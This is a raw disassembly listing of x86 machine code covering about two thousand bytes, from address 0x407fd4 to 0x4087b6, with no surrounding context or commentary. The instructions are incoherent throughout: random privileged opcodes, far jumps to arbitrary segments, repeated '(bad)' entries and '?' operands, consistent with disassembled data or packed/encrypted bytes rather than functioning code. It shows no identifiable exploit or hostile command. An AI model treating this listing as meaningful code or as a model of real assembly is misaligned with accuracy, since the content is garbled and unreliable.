  407fd4:	test   DWORD PTR [edi+0x3e14d45],ebx
  407fda:	mov    BYTE PTR [ebp+0x51],dh
  407fdd:	dec    ebp
  407fde:	pushf  
  407fdf:	stc    
  407fe0:	retf   0xe768
  407fe3:	pop    esi
  407fe4:	mov    esp,0xb13e52a3
  407fe9:	mov    eax,ds:0x90d487f
  407fee:	sub    eax,eax
  407ff0:	stc    
  407ff1:	lea    eax,[ecx-0x5364178]
  407ff7:	fisttp QWORD PTR [ebx-0x4ce2329e]
  407ffd:	fmulp  st(7),st
  407fff:	pop    ss
  408000:	xchg   esi,eax
  408001:	mov    edx,ebx
  408003:	xchg   DWORD PTR [edx+0x32b45f1d],esp
  408009:	xlat   BYTE PTR ds:[ebx]
  40800a:	mov    edx,0x32ec7f08
  40800f:	popa   
  408010:	jmp    0x4667:0x4734a914
  408017:	fadd   DWORD PTR [esi]
  408019:	rcr    BYTE PTR [eax+edx*8],0xc0
  40801d:	or     al,0x15
  408020:	leave  
  408021:	test   ebp,ecx
  408023:	push   ss
  408024:	mov    al,ds:0xce4caab7
  408029:	pop    esi
  40802a:	cld    
  40802b:	push   esp
  40802c:	mov    ch,0xd2
  40802e:	sub    ebx,DWORD PTR [eax-0x61]
  408031:	and    dl,al
  408033:	repz aad 0xb6
  408036:	jnp    0x408025
  408038:	push   ebx
  408039:	out    dx,eax
  40803a:	es shr ah,1
  40803d:	loopne 0x407fc5
  40803f:	ja     0x408078
  408041:	xchg   ebp,eax
  408042:	or     dh,BYTE PTR [edi*4-0x310be1ca]
  408049:	rcr    BYTE PTR [eax-0x565451b9],1
  40804f:	xchg   edx,eax
  408050:	pop    ebp
  408051:	test   al,0x39
  408053:	sub    eax,0xf4d9a1f6
  408058:	pop    esi
  408059:	xor    BYTE PTR [ebx],al
  40805b:	leave  
  40805c:	mov    ds:0x6f2c33b8,al
  408061:	hlt    
  408062:	push   ebp
  408063:	xchg   edi,eax
  408064:	in     eax,0xeb
  408066:	mov    ebx,?
  408068:	sbb    BYTE PTR [ecx],dl
  40806a:	fstp   QWORD PTR [edi-0x80]
  40806d:	(bad)  
  40806e:	rcl    BYTE PTR [ebp+0x6703a9c8],1
  408074:	es dec edi
  408076:	aam    0x65
  408078:	leave  
  408079:	xchg   ebx,eax
  40807a:	es mov edx,0xa92e4c76
  408080:	cwde   
  408081:	inc    esp
  408082:	ins    BYTE PTR es:[edi],dx
  408083:	imul   ecx,DWORD PTR [edx],0x52
  408086:	pop    ebx
  408087:	call   0x755bb845
  40808c:	pop    esi
  40808d:	sbb    DWORD PTR [edx-0x55fa409d],ecx
  408093:	fnstcw WORD PTR [edi+0x72f4863]
  408099:	jge    0x408043
  40809b:	add    eax,0xd60c85be
  4080a0:	push   eax
  4080a1:	or     al,0xa9
  4080a3:	add    DWORD PTR [eax-0x3c338c44],ebx
  4080a9:	jle    0x408119
  4080ab:	loop   0x4080e7
  4080ad:	repnz in eax,0x62
  4080b0:	ja     0x40808c
  4080b2:	js     0x40804e
  4080b4:	out    dx,eax
  4080b5:	dec    ebp
  4080b7:	aas    
  4080b8:	push   ebx
  4080b9:	stos   BYTE PTR es:[edi],al
  4080ba:	loope  0x4080b1
  4080bc:	jl     0x4080df
  4080be:	cmc    
  4080bf:	jno    0x40812b
  4080c1:	sub    BYTE PTR [ebx],ch
  4080c3:	sbb    ah,cl
  4080c5:	pop    es
  4080c6:	idiv   DWORD PTR [edx-0x78]
  4080c9:	add    al,al
  4080cb:	adc    esp,DWORD PTR [ebx]
  4080cd:	arpl   WORD PTR [ebp-0x2a0b09e],si
  4080d3:	xlat   BYTE PTR ds:[ebx]
  4080d4:	loope  0x4080e4
  4080d6:	add    al,0x8d
  4080d8:	stos   BYTE PTR es:[edi],al
  4080d9:	jp     0x408081
  4080db:	pop    edx
  4080dc:	xlat   BYTE PTR ds:[ebx]
  4080dd:	data16 fsub DWORD PTR [eax+eiz*1-0x15649473]
  4080e5:	fld1   
  4080e7:	in     eax,0xfb
  4080e9:	mov    esi,0xbf065064
  4080ee:	jge    0x408108
  4080f0:	xor    BYTE PTR [edi+0x7cbcf81d],ch
  4080f6:	mov    dh,0x12
  4080f8:	aam    0x5f
  4080fa:	jg     0x4080a7
  4080fc:	sbb    esi,esp
  4080fe:	xor    al,0x9b
  408100:	push   ebx
  408101:	inc    ebp
  408102:	lods   al,BYTE PTR ds:[esi]
  408103:	xchg   edx,eax
  408104:	loop   0x40815f
  408106:	xchg   esp,eax
  408107:	pop    ebx
  408108:	lidtd  [ecx+0x4873ded9]
  40810f:	cmp    dh,BYTE PTR [edi]
  408111:	enter  0x4ef1,0x41
  408115:	les    eax,FWORD PTR [esi]
  408117:	jns    0x408145
  408119:	dec    edi
  40811a:	mov    ebx,es
  40811c:	call   0x3cff:0x689749d5
  408123:	jb     0x40819b
  408125:	out    0xe9,eax
  408127:	add    al,0xb2
  408129:	xchg   ebx,eax
  40812a:	loopne 0x408170
  40812c:	imul   edx,ecx,0x64
  40812f:	add    BYTE PTR [edx-0x17],dl
  408132:	es test al,0x82
  408135:	inc    ebp
  408136:	jo     0x40814b
  408138:	sbb    edx,DWORD PTR [esi-0xc]
  40813b:	dec    edi
  40813c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40813d:	ror    BYTE PTR [esi+0x77a01be7],1
  408143:	lds    ecx,FWORD PTR [ebx+0x6b]
  408146:	(bad)  
  408147:	mov    WORD PTR [esi+0x510d1306],ds
  40814d:	repnz lahf 
  40814f:	cmp    al,0x41
  408151:	sbb    edx,DWORD PTR [edi+eiz*2+0x48]
  408155:	adc    ebp,DWORD PTR [edi]
  408157:	repz dec esi
  408159:	dec    ecx
  40815a:	inc    esp
  40815b:	test   al,0x3
  40815d:	icebp  
  40815e:	ja     0x408174
  408160:	and    eax,0x981a7612
  408165:	lock jecxz 0x408172
  408168:	jmp    0x4560:0xb179544c
  40816f:	push   ebp
  408170:	sbb    bl,BYTE PTR [ecx+0x34386a32]
  408176:	xchg   edi,eax
  408177:	mov    ecx,0x4da01fdf
  40817c:	js     0x408195
  40817e:	(bad)  
  40817f:	fdiv   QWORD PTR [esi-0x7b4dc0d6]
  408185:	sbb    BYTE PTR ds:0xfc9cc09c,dl
  40818b:	icebp  
  40818c:	xor    esi,DWORD PTR [edx-0x6e]
  40818f:	pop    esi
  408190:	push   eax
  408191:	pop    edx
  408192:	mov    edi,0x18398af3
  408197:	fidiv  DWORD PTR [ecx-0x78]
  40819a:	loope  0x408188
  40819c:	test   BYTE PTR [edi+0x22],dh
  40819f:	enter  0x25aa,0x37
  4081a3:	mov    ebx,0x9579f3b1
  4081a8:	jge    0x40816c
  4081aa:	mov    BYTE PTR [edi-0x2c939027],cl
  4081b0:	push   ebp
  4081b1:	mov    DWORD PTR [ecx+0x35],ebp
  4081b4:	or     bh,bh
  4081b6:	aam    0xa
  4081b8:	les    edx,FWORD PTR [esi+0x1cfd0365]
  4081be:	inc    edi
  4081bf:	aad    0x41
  4081c1:	push   ebx
  4081c2:	(bad)  
  4081c3:	in     eax,0x5f
  4081c5:	in     al,dx
  4081c6:	or     al,0xd
  4081c8:	jo     0x408151
  4081ca:	mov    eax,ds:0xc798bc65
  4081cf:	sbb    DWORD PTR [edx+0x2c],eax
  4081d2:	fadd   QWORD PTR [ecx]
  4081d4:	lods   eax,DWORD PTR ds:[esi]
  4081d5:	xchg   ecx,eax
  4081d6:	shl    BYTE PTR [ebx-0x49e977cb],1
  4081dc:	std    
  4081dd:	enter  0xa02c,0x58
  4081e1:	dec    esi
  4081e2:	inc    ebx
  4081e3:	add    dh,bh
  4081e5:	cld    
  4081e6:	sahf   
  4081e7:	pop    ss
  4081e8:	or     eax,0xa5c0d50a
  4081ed:	scas   al,BYTE PTR es:[edi]
  4081ee:	test   al,0x81
  4081f0:	jo     0x4081e0
  4081f2:	push   esp
  4081f3:	inc    edi
  4081f4:	sar    edx,cl
  4081f6:	jle    0x408230
  4081f8:	xor    DWORD PTR [ecx],0x15
  4081fb:	adc    al,cl
  4081fd:	(bad)  
  4081fe:	fdiv   st(6),st
  408200:	pop    eax
  408201:	inc    eax
  408202:	imul   esp,DWORD PTR [edx-0x41],0x19
  408206:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408207:	mov    al,bl
  408209:	and    ah,dh
  40820b:	dec    eax
  40820c:	sbb    eax,DWORD PTR [ebp-0x5491b90b]
  408212:	aas    
  408213:	dec    esi
  408214:	pop    ss
  408215:	test   eax,0x71dcc775
  40821a:	xchg   edx,eax
  40821b:	add    eax,0xd4769c32
  408220:	and    bh,BYTE PTR [ebp+0x42]
  408223:	test   DWORD PTR [edi-0x61f8c135],esp
  408229:	jmp    FWORD PTR [edi-0xa]
  40822c:	loope  0x40825c
  40822e:	pop    ss
  40822f:	mov    ds:0xe76ff615,al
  408234:	leave  
  408235:	call   0x9083da0f
  40823a:	loopne 0x4081d6
  40823c:	dec    ebx
  40823d:	mov    ?,edx
  40823f:	cmp    eax,0xcb4240b9
  408244:	cmp    eax,0xa20f3bcf
  408249:	fbld   TBYTE PTR [esi+0x70]
  40824c:	add    DWORD PTR [esi+0x4],esp
  40824f:	xchg   ebp,eax
  408250:	lahf   
  408251:	fstp   st(2)
  408253:	or     bh,BYTE PTR [eax+0x2ef951ac]
  408259:	jo     0x40829a
  40825b:	sbb    dl,BYTE PTR [eax+0x53cd4c1e]
  408261:	or     DWORD PTR [eax+esi*4+0x36b74f9d],0x1a
  408269:	adc    BYTE PTR [eax],ch
  40826b:	ret    
  40826c:	mov    dh,0x73
  40826e:	lock mov al,0x34
  408271:	jecxz  0x408228
  408273:	cmp    esi,DWORD PTR [eax-0x69]
  408276:	xchg   esp,eax
  408277:	retf   
  408278:	rcr    DWORD PTR [ebx+0x791833c8],cl
  40827e:	sbb    eax,0x45b1c3d1
  408283:	lods   eax,DWORD PTR ds:[esi]
  408284:	and    BYTE PTR [edi-0x34],0x5d
  408288:	ror    BYTE PTR ds:0x978cc56e,1
  40828e:	scas   al,BYTE PTR es:[edi]
  40828f:	mov    bl,0x63
  408291:	mov    WORD PTR [esi],es
  408293:	cmp    BYTE PTR [edx],dh
  408295:	sub    edx,esp
  408297:	sub    DWORD PTR [esi+ebp*4+0x14],ebp
  40829b:	pop    eax
  40829c:	jmp    0x14f9a6ec
  4082a1:	call   0x8ff6fbd7
  4082a6:	push   edx
  4082a7:	xchg   ecx,eax
  4082a8:	push   0xffffffa3
  4082aa:	std    
  4082ab:	outs   dx,DWORD PTR ds:[esi]
  4082ac:	fwait
  4082ad:	leave  
  4082ae:	and    bh,bh
  4082b0:	mov    ah,0xaa
  4082b2:	and    bh,ch
  4082b4:	daa    
  4082b5:	pop    esp
  4082b6:	mov    ds:0xb9f02120,eax
  4082bb:	push   0xffffffe8
  4082bd:	call   0x74390477
  4082c2:	jl     0x408337
  4082c4:	fwait
  4082c5:	or     ebp,0xa9a2378d
  4082cb:	test   eax,0xc28c2d71
  4082d0:	pop    eax
  4082d1:	sar    DWORD PTR [ebp+0x2c1d54b0],cl
  4082d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082d8:	std    
  4082d9:	rcl    BYTE PTR [ebp+0x5a],cl
  4082dc:	dec    edx
  4082dd:	sbb    bl,BYTE PTR [ecx+ebx*2-0x56]
  4082e1:	jb     0x408319
  4082e3:	xlat   BYTE PTR ds:[ebx]
  4082e4:	popf   
  4082e5:	loop   0x40829a
  4082e7:	or     eax,0x1d8695c0
  4082ec:	pop    ecx
  4082ed:	pop    edx
  4082ee:	lods   eax,DWORD PTR ds:[esi]
  4082ef:	dec    esi
  4082f0:	sub    BYTE PTR [ebp+0x3c],ah
  4082f3:	repnz loopne 0x408313
  4082f6:	and    DWORD PTR [eax+0x150598f4],edi
  4082fc:	pop    es
  4082fd:	mov    esp,0x40b98697
  408302:	lea    ebx,[edi+0x1ca339be]
  408308:	mov    ecx,0xfdaefed4
  40830d:	mov    esi,0xe7fc506c
  408312:	dec    esp
  408313:	push   0xfffffffa
  408315:	pushf  
  408316:	mov    ebx,DWORD PTR [edx+0x42]
  408319:	xchg   DWORD PTR [eax+0x3e3d67d7],ebx
  40831f:	jb     0x4082ab
  408321:	dec    eax
  408322:	pop    eax
  408323:	inc    esi
  408324:	daa    
  408325:	jb     0x408386
  408327:	cmp    al,0x35
  408329:	out    0x5c,al
  40832b:	jle    0x4082e9
  40832d:	popf   
  40832e:	pop    ebp
  40832f:	pushf  
  408330:	ret    
  408331:	push   es
  408332:	sub    bl,BYTE PTR [ecx+0x4]
  408335:	adc    ebx,DWORD PTR [ebx-0x7b]
  408338:	or     BYTE PTR [edi],bl
  40833a:	fidiv  WORD PTR [esp+ecx*1]
  40833d:	out    0x10,eax
  40833f:	idiv   esp
  408341:	inc    eax
  408342:	mov    BYTE PTR [eax-0x550a901d],0xd4
  408349:	test   eax,0x20d89ad8
  40834e:	adc    bl,BYTE PTR [esi+0x200d0fed]
  408354:	mov    bh,0xf2
  408356:	pop    edi
  408357:	sbb    al,0x2
  408359:	pop    esp
  40835a:	sahf   
  40835b:	or     BYTE PTR [edi+0x1453d953],ah
  408361:	inc    edx
  408362:	push   ebx
  408363:	test   BYTE PTR [esi+0xfac9a00],bl
  408369:	inc    esp
  40836a:	lods   al,BYTE PTR ds:[esi]
  40836b:	push   edx
  40836c:	cli    
  40836d:	out    0x5d,eax
  40836f:	dec    ebx
  408370:	sahf   
  408371:	in     eax,0x78
  408373:	std    
  408374:	or     BYTE PTR [ebx-0x42],dh
  408377:	fs jmp 0x4083ae
  40837a:	cwde   
  40837b:	xchg   ecx,eax
  40837c:	dec    ebp
  40837d:	mov    bh,0x49
  40837f:	lds    edx,FWORD PTR [esi+0x67993816]
  408385:	inc    edx
  408386:	lea    ecx,[ebx]
  408388:	mov    WORD PTR [eax+eiz*1-0x69988ecf],?
  40838f:	je     0x408335
  408391:	lahf   
  408392:	inc    ebx
  408393:	nop
  408394:	or     al,0x25
  408396:	xchg   ebp,eax
  408397:	std    
  408398:	mov    ecx,0xebe765c1
  40839d:	pop    ss
  40839e:	jns    0x4083a3
  4083a0:	lahf   
  4083a1:	and    bl,BYTE PTR [edi]
  4083a3:	sahf   
  4083a4:	scas   al,BYTE PTR es:[edi]
  4083a5:	dec    ebp
  4083a6:	popf   
  4083a7:	sahf   
  4083a8:	mov    bl,0x74
  4083aa:	rcr    DWORD PTR [edi+0x44],0xd9
  4083ae:	dec    ecx
  4083af:	xor    bl,dh
  4083b1:	rcr    DWORD PTR [esi-0x2fda26bd],0x8c
  4083b8:	neg    BYTE PTR [edx]
  4083ba:	jp     0x4083a8
  4083bc:	cdq    
  4083bd:	pop    esp
  4083be:	dec    esp
  4083bf:	and    eax,0x806838d9
  4083c4:	push   edi
  4083c5:	and    BYTE PTR ds:0x5bb4ddce,al
  4083cb:	dec    ebp
  4083cc:	mov    eax,ds:0x7d61dbce
  4083d1:	and    ch,ch
  4083d3:	loope  0x4083bd
  4083d5:	loope  0x4083d3
  4083d7:	mov    cl,0x8d
  4083d9:	dec    ecx
  4083da:	and    al,0x6f
  4083dc:	in     eax,dx
  4083dd:	sub    eax,0x76d11e1e
  4083e2:	fst    DWORD PTR [edi+eax*4]
  4083e5:	pop    edi
  4083e6:	es push esi
  4083e8:	in     eax,dx
  4083e9:	mov    eax,esi
  4083eb:	sub    BYTE PTR [eax-0x5d],cl
  4083ee:	into   
  4083ef:	out    0xb,al
  4083f1:	and    eax,0xa638f933
  4083f6:	pop    ss
  4083f7:	mov    ecx,0xa6b929b3
  4083fc:	daa    
  4083fd:	or     bh,bl
  4083ff:	int    0xce
  408401:	les    ecx,FWORD PTR [esi+edi*1]
  408404:	xchg   edi,eax
  408405:	mov    edi,0xe147b8af
  40840a:	adc    esp,edx
  40840c:	xchg   ecx,eax
  40840d:	sub    DWORD PTR [esi-0x69],eax
  408410:	nop
  408411:	data16 out 0xa1,al
  408414:	add    DWORD PTR es:[edx+0xa],ebp
  408418:	inc    ecx
  408419:	sbb    BYTE PTR [edi-0x10],bh
  40841c:	hlt    
  40841d:	jge    0x40844d
  40841f:	push   ebx
  408420:	xchg   esp,eax
  408421:	mov    ecx,0xc8fc01e7
  408426:	or     eax,0xc2d1a467
  40842b:	sbb    al,0x75
  40842d:	retf   
  40842e:	fidivr WORD PTR [edi]
  408430:	dec    edi
  408431:	add    ch,BYTE PTR [eax]
  408433:	lahf   
  408434:	adc    al,0xd8
  408436:	and    DWORD PTR [eax],0xcff69732
  40843c:	out    dx,eax
  40843d:	push   ebp
  40843e:	loop   0x408496
  408440:	xor    eax,0x3190b66b
  408445:	dec    eax
  408446:	repz pop esp
  408448:	xor    BYTE PTR [ebx+ecx*8],0x74
  40844c:	mov    bl,ah
  40844e:	inc    esp
  40844f:	and    BYTE PTR [edi-0x68],0x9a
  408453:	sbb    cl,dh
  408455:	out    0x7b,eax
  408457:	stc    
  408458:	jmp    ebp
  40845a:	and    eax,0x6e95def
  40845f:	dec    eax
  408460:	popa   
  408461:	jl     0x4084de
  408463:	xchg   ebp,eax
  408464:	pop    esi
  408465:	dec    edx
  408466:	pop    edi
  408467:	sub    BYTE PTR [esi],bh
  408469:	sbb    BYTE PTR [ecx-0x59],dl
  40846c:	ins    DWORD PTR es:[edi],dx
  40846d:	das    
  40846e:	pushf  
  40846f:	(bad)  
  408470:	push   ebx
  408471:	pop    edx
  408472:	cmp    al,0x6c
  408474:	mov    ds:0xf8ecc503,al
  408479:	rcl    DWORD PTR [esi-0x25],1
  40847c:	dec    ebp
  40847d:	or     ecx,ebx
  40847f:	loop   0x4084b2
  408481:	dec    DWORD PTR [edx]
  408483:	inc    ebx
  408484:	xchg   esp,ecx
  408486:	call   0x67219779
  40848b:	and    eax,0x1364b239
  408490:	repz imul esp,DWORD PTR [eax],0x5d
  408494:	mov    dl,bl
  408496:	cmp    ah,dl
  408498:	push   esi
  408499:	mov    bh,0xfb
  40849b:	retf   
  40849c:	fld    st(5)
  40849e:	fistp  DWORD PTR [esp+eiz*4]
  4084a1:	stos   DWORD PTR es:[edi],eax
  4084a2:	jae    0x40846f
  4084a4:	lods   eax,DWORD PTR ds:[esi]
  4084a5:	or     ebp,ebp
  4084a7:	push   0xffffffa2
  4084a9:	pop    eax
  4084aa:	and    al,0xd4
  4084ac:	inc    edx
  4084ad:	mov    dl,0x16
  4084af:	mov    esi,0x2b74e1b7
  4084b4:	mov    bh,0x78
  4084b6:	xchg   esp,eax
  4084b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084b8:	xor    al,cl
  4084ba:	test   ebp,ecx
  4084bc:	cmp    al,0x4a
  4084be:	repz (bad) 
  4084c0:	sub    al,bl
  4084c2:	lock push ebp
  4084c4:	aam    0x6f
  4084c6:	int    0x69
  4084c8:	les    eax,FWORD PTR [edx+0x9]
  4084cb:	push   edi
  4084cc:	add    ah,BYTE PTR [esi+0x51]
  4084cf:	or     ch,0x87
  4084d2:	stos   BYTE PTR es:[edi],al
  4084d3:	repnz iret 
  4084d5:	mov    dh,0x24
  4084d7:	push   0xffffff86
  4084d9:	rol    bl,cl
  4084db:	cmp    DWORD PTR [edi+0x6cc5e979],0x5b
  4084e2:	mul    DWORD PTR [eax]
  4084e4:	jp     0x4084ce
  4084e6:	in     eax,dx
  4084e7:	add    al,0x3c
  4084e9:	jb     0x4084d4
  4084eb:	(bad)  [edx+0x2e934f5a]
  4084f1:	sbb    ch,ah
  4084f3:	lahf   
  4084f4:	data16 jbe 0x408568
  4084f7:	dec    esp
  4084f8:	pop    edi
  4084f9:	inc    edi
  4084fa:	push   ecx
  4084fb:	cli    
  4084fc:	push   ebx
  4084fd:	test   ebp,ebx
  4084ff:	int3   
  408500:	call   0x70a1d7b3
  408505:	push   esi
  408506:	es enter 0x7fa1,0xe
  40850b:	fnstenv [eax]
  40850d:	repz mov cl,0x17
  408510:	pop    ss
  408511:	lock xchg edx,eax
  408513:	jnp    0x4084f4
  408515:	xchg   ebp,eax
  408516:	mov    cl,0xe0
  408518:	push   edi
  408519:	sar    BYTE PTR [ebx-0x1253af0e],cl
  40851f:	hlt    
  408520:	int3   
  408521:	bound  eax,QWORD PTR [esi]
  408523:	ins    BYTE PTR es:[edi],dx
  408524:	mov    WORD PTR [ecx],?
  408526:	pop    ebx
  408527:	jmp    0x408502
  408529:	loop   0x4085a8
  40852b:	mov    esi,0xf3903bbd
  408530:	std    
  408531:	xchg   esi,eax
  408532:	mov    al,ds:0x4e505107
  408537:	adc    bl,ch
  408539:	mov    ds:0x1dc41f12,al
  40853e:	push   ebx
  40853f:	(bad)  
  408540:	call   0x3466c2b0
  408545:	jmp    ebp
  408547:	xchg   BYTE PTR [edx],ch
  408549:	pop    ebp
  40854a:	cmp    BYTE PTR [ecx+edi*4-0x50602eee],dh
  408551:	gs push ss
  408553:	add    al,0xa6
  408555:	push   ebx
  408556:	es inc ebx
  408558:	push   ds
  408559:	icebp  
  40855a:	into   
  40855b:	and    al,0xb1
  40855d:	inc    ebx
  40855e:	jbe    0x4085b5
  408560:	data16 and BYTE PTR [bx+si-0x245c],dh
  408566:	out    dx,al
  408567:	outs   dx,DWORD PTR ds:[esi]
  408568:	in     al,dx
  408569:	add    esi,esi
  40856b:	ret    
  40856c:	xchg   edi,eax
  40856d:	jmpw   0x5b64
  408571:	scas   al,BYTE PTR es:[edi]
  408572:	push   cs
  408573:	jne    0x4085d8
  408575:	cmp    ch,ch
  408577:	fbld   TBYTE PTR [edi]
  408579:	mov    WORD PTR [ecx+0x55],cs
  40857c:	mov    eax,ds:0xca089840
  408581:	pop    ds
  408582:	mov    dl,0x7
  408584:	xor    BYTE PTR [esi-0x7b642a8b],bh
  40858a:	push   0x3a
  40858c:	sbb    eax,0xa7359367
  408591:	add    al,0x46
  408593:	and    dl,BYTE PTR [ebp+0x32026796]
  408599:	xor    ecx,DWORD PTR [esi-0x69]
  40859c:	in     eax,0x59
  40859e:	jb     0x408610
  4085a0:	xor    al,0x7d
  4085a2:	and    al,0xe6
  4085a4:	or     dl,al
  4085a6:	arpl   dx,bp
  4085a8:	dec    ecx
  4085a9:	push   ds
  4085aa:	pop    eax
  4085ab:	add    BYTE PTR [edx-0x7dd76d92],ah
  4085b1:	popf   
  4085b2:	pop    es
  4085b3:	aam    0x6a
  4085b5:	sbb    al,0xc9
  4085b7:	xor    edi,ecx
  4085b9:	arpl   WORD PTR [eax+0x14a7d63b],di
  4085bf:	mov    al,0xe1
  4085c1:	stc    
  4085c2:	sbb    BYTE PTR [ecx+0x669beab1],ch
  4085c8:	dec    ebx
  4085c9:	rol    ebp,0xb4
  4085cc:	(bad)  
  4085ce:	ins    BYTE PTR es:[edi],dx
  4085cf:	sbb    bh,ah
  4085d1:	in     eax,0x32
  4085d3:	arpl   WORD PTR [ebx+0x6769299d],dx
  4085d9:	pop    es
  4085da:	inc    eax
  4085db:	xchg   di,ax
  4085dd:	bound  edi,QWORD PTR [ebp+0x45]
  4085e0:	aas    
  4085e1:	jp     0x40862e
  4085e3:	inc    edx
  4085e4:	pop    ecx
  4085e5:	sub    eax,0xe8b0bdf9
  4085ea:	inc    esi
  4085eb:	push   esp
  4085ec:	imul   esi,DWORD PTR [ebx-0x3f],0x8f46914e
  4085f3:	test   al,0xc4
  4085f5:	push   edx
  4085f6:	xor    al,0xa4
  4085f8:	jp     0x4085f5
  4085fa:	mul    DWORD PTR [esi+0x1c]
  4085fd:	dec    esp
  4085fe:	shr    BYTE PTR [ecx],0xf4
  408601:	cmp    edi,DWORD PTR [ecx+0x58]
  408604:	jg     0x4085a3
  408606:	jmp    0x5053:0x40dd6cc7
  40860d:	fidivr DWORD PTR [edi+0x1f8e08ca]
  408613:	push   cs
  408614:	xor    ebx,DWORD PTR [edi+0x27]
  408617:	dec    esi
  408618:	mov    bl,0x23
  40861a:	push   esp
  40861b:	popf   
  40861c:	leave  
  40861d:	add    DWORD PTR [esi-0x726ebc14],0xffffffb0
  408624:	mov    esp,0xbffa0d4c
  408629:	loope  0x40868f
  40862b:	add    ecx,DWORD PTR [edx+0x5b93de9f]
  408631:	in     eax,0x37
  408633:	or     ebx,DWORD PTR [esi]
  408635:	pop    ecx
  408636:	xchg   ebp,eax
  408637:	dec    esp
  408638:	and    ebx,DWORD PTR [ebp+edi*8-0x3a]
  40863c:	pop    esp
  40863d:	(bad)  
  40863e:	(bad)  [eax+0x3b]
  408641:	sub    eax,0x7112ad3e
  408646:	cmp    ebx,DWORD PTR [esi-0x7c]
  408649:	popa   
  40864a:	dec    esp
  40864b:	fwait
  40864c:	and    eax,0xd14319cf
  408651:	sbb    al,0xa2
  408653:	test   eax,0xf8a00a62
  408658:	dec    edx
  408659:	out    0x95,al
  40865b:	out    dx,al
  40865c:	clc    
  40865d:	dec    ebx
  40865e:	int    0x19
  408660:	loope  0x408661
  408662:	mov    ds:0x39aeae98,al
  408667:	dec    ebx
  408668:	ja     0x4085f7
  40866a:	icebp  
  40866b:	and    ah,BYTE PTR [ebp-0x38]
  40866e:	mov    edi,0xa038b13c
  408673:	loope  0x4086cd
  408675:	inc    esi
  408676:	or     al,0x3d
  408678:	inc    eax
  408679:	sbb    DWORD PTR ds:0xde2700ed,ebp
  40867f:	lds    esp,FWORD PTR [edi-0x7bb1b44f]
  408685:	stos   BYTE PTR es:[edi],al
  408686:	mov    WORD PTR [edx],ss
  408688:	push   ds
  408689:	pusha  
  40868a:	into   
  40868b:	mov    ebp,0xc8ea9799
  408690:	and    BYTE PTR [esi+0x4820418f],al
  408696:	stc    
  408697:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408698:	into   
  408699:	pop    ebx
  40869a:	aam    0x71
  40869c:	fisub  WORD PTR [ebx-0x31]
  40869f:	pushf  
  4086a0:	add    ah,BYTE PTR [ecx+0x3e7d28ee]
  4086a6:	sub    eax,0x6b17a553
  4086ab:	pop    ss
  4086ac:	or     DWORD PTR [edi],0xa1320de2
  4086b2:	sbb    ch,BYTE PTR [edx+0x2673f54b]
  4086b8:	test   DWORD PTR [eax+0x1be2462],esi
  4086be:	mov    bh,ch
  4086c0:	jle    0x40868c
  4086c2:	push   cs
  4086c3:	mov    eax,0xaf9a0488
  4086c8:	fxch   st(1)
  4086ca:	pusha  
  4086cb:	or     BYTE PTR ds:0x25e030dc,dl
  4086d1:	idiv   DWORD PTR [ebx-0x474105bc]
  4086d7:	pop    es
  4086d8:	add    esi,ebp
  4086da:	lahf   
  4086db:	and    eax,0x4ba43072
  4086e0:	cdq    
  4086e1:	mov    cl,0x3a
  4086e3:	hlt    
  4086e4:	mov    dl,0xd1
  4086e6:	loope  0x4086a9
  4086e8:	test   esi,esi
  4086ea:	loop   0x4086a3
  4086ec:	fs inc ecx
  4086ee:	inc    ecx
  4086ef:	pop    ss
  4086f0:	shl    bl,0x30
  4086f3:	inc    ebp
  4086f4:	js     0x19c151f2
  4086fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086fb:	neg    BYTE PTR [ecx-0x3a81815b]
  408701:	cmp    eax,0x374241e2
  408706:	mov    ecx,edx
  408708:	xor    al,0x5b
  40870a:	cwde   
  40870b:	adc    al,0x75
  40870d:	jl     0x408694
  40870f:	sub    al,0x7e
  408711:	inc    eax
  408712:	stos   BYTE PTR es:[edi],al
  408713:	cdq    
  408714:	inc    ebx
  408715:	pushf  
  408716:	push   ecx
  408717:	neg    ebx
  408719:	outs   dx,DWORD PTR ds:[esi]
  40871a:	mov    ch,0x90
  40871c:	or     BYTE PTR [edi+0x51],bl
  40871f:	adc    DWORD PTR [ebx+0x67],esi
  408722:	jecxz  0x4086aa
  408724:	cmp    BYTE PTR [esi+0x5e],bl
  408727:	inc    edi
  408728:	cwde   
  408729:	adc    eax,0x2a052eab
  40872e:	ficomp WORD PTR [ecx+0x6c]
  408731:	and    BYTE PTR [ebx+esi*8-0x6c430ae5],bh
  408738:	sahf   
  408739:	push   edx
  40873a:	ss int 0x37
  40873d:	pusha  
  40873e:	int    0xe5
  408740:	push   edx
  408741:	dec    ebx
  408742:	(bad)  
  408744:	sti    
  408745:	adc    DWORD PTR [eax+0x20],edi
  408748:	dec    esi
  408749:	cmp    eax,0xf0f884c4
  40874e:	nop
  40874f:	ret    0x703f
  408752:	xor    dl,BYTE PTR [esi]
  408754:	aam    0xa5
  408756:	(bad)  
  408757:	pop    ecx
  408758:	aas    
  408759:	inc    esi
  40875a:	loopne 0x4086fc
  40875c:	cmp    BYTE PTR [eax-0x41e35340],0x68
  408763:	or     ch,BYTE PTR [eax+0x5a438db3]
  408769:	std    
  40876a:	pop    ss
  40876b:	adc    BYTE PTR [ebx-0x25],dl
  40876e:	jmp    0xc5e128b5
  408773:	cmp    edi,0xfb2a8dc1
  408779:	mov    DWORD PTR [ebp+0x4501b5eb],0x5fd22643
  408783:	loopne 0x408738
  408785:	cwde   
  408786:	fidivr DWORD PTR [edx]
  408788:	dec    edx
  408789:	fcomp  st(6)
  40878b:	inc    edi
  40878c:	cli    
  40878d:	dec    ebx
  40878e:	scas   al,BYTE PTR es:[edi]
  40878f:	sbb    eax,0x7962ec2b
  408794:	rol    DWORD PTR [ecx],cl
  408796:	dec    esp
  408797:	xor    bh,BYTE PTR [ecx]
  408799:	dec    esp
  40879a:	mov    ss,WORD PTR [edx+0x4e]
  40879d:	daa    
  40879e:	out    0x8,al
  4087a0:	dec    esp
  4087a1:	jmp    0x4087d7
  4087a3:	adc    al,0x29
  4087a5:	mov    ebx,edx
  4087a7:	pop    ecx
  4087a8:	test   eax,0x710b7744
  4087ad:	mov    bl,0xca
  4087af:	push   esp
  4087b0:	mov    edi,DWORD PTR [ecx-0x1fecb3d2]
  4087b6:	mov    al,0x9c
